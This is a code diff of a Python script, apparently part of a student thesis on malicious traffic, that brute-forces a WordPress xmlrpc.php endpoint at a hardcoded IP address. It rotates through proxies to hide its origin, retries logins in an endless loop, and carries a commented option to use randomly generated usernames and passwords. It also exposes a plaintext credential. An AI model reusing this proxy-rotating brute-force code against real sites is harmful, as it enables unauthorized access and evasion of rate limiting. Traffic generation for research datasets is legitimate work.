@@ -24,8 +24,7 @@ sys.path.extend(['/home/expresidentz/Desktop/skripsi-malicious-traffics-unhas/be
 #MODULES
 from EmailMaker import NamesPickRandom
 from PasswordMaker import PasswordPickRandom
-from ProxyTest import ProxyTester
-
+from ProxyTest import CheckIfProxySameAsIP
 """
 For BruteForce testing purpose with XML-RPC
 """
@@ -55,26 +54,30 @@ class ProxiedTransport(xmlrpc.client.Transport):
         return connection
 
 # server = xmlrpc.client.ServerProxy('http://betty.userland.com', transport=transport)
+i = 0
 while True:
-    proxy_complete = ProxyTester().split(":")
-    proxy_ip, proxy_port = proxy_complete
+    proxy_raw, proxy_complete = CheckIfProxySameAsIP()
+    proxy_ip, proxy_port  = proxy_complete.split(":")
     proxy_port = int(proxy_port)
     print(proxy_ip, proxy_port)
 
     transport = ProxiedTransport()
     transport.set_proxy(proxy_ip, proxy_port, secure=True)
     client = Client(url = "https://103.185.193.35/xmlrpc.php", username = "resephariankamu",password="LiG5hqDiMNCacSa", transport=transport)
+    # client = Client(url = "https://103.185.193.35/xmlrpc.php", username = NamesPickRandom(),password=PasswordPickRandom(), transport=transport)
 
     try:
         post = WordPressPost()
-        post.title = 'test nov 10'
+        post.title = 'test nov 23 DI RUMAH'
         post.content = 'ADAKAH RAYYAN DI HAATIMU'
-        post.id = client.call(posts.NewPost(post))
         post.post_status = "publish"
+        post.id = client.call(posts.NewPost(post))
         print("POSTINGAN BERHASIL DIPOST")
         break
     except:
-        print("NDA BISA WORDPRESSNYA")
+        print(f"BRUTEFORCING XMLRPC - {i}")
+        i = i + 1
+        continue
 
 # try:
 #     client.call(posts.EditPost(post.id, post))
